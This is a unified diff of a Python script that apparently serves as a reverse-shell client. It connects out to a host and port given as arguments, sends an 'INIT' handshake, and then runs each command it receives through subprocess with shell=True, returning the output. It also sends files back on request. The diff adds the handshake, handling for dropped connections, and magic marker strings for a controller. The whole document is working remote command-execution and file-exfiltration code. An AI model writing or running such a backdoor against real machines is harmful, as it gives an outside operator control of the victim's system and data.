@@ -22,11 +22,20 @@ def send_file(filename, sock):
         sock.send(b"_3X1T_5TATUS=0")
 
 def execute_command(s):
+    s.send(b"INIT:SunnyWeatherAhead:BlueSkies")
     while True:
-        data = s.recv(1024)
+        try:
+            data = s.recv(1024)
+        except ConnectionResetError:
+            break
         print(data)
+        if not data:
+            break
 
-        if b"DEADBEEF1337" in data:
+        if b"wepa" in data:
+            continue
+
+        if data == b"HarmoniousJazzPlaysSoftly && echo _3X1T_5TATUS=$? || echo _3X1T_5TATUS=$?\n":
             s.send(b"1_3X1T_5TATUS=0")
             continue
 
@@ -40,8 +49,6 @@ def execute_command(s):
             send_file(file, s)
             continue
 
-        if not data:
-            break
 
         proc = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         stdout_value = proc.stdout.read() + proc.stderr.read()
@@ -62,7 +69,6 @@ def main():
     if len(sys.argv) < 3:
         parser.print_help(sys.stderr)
         sys.exit(1)
-
     s = connect_to_host(args.host, int(args.port))
     execute_command(s)
 
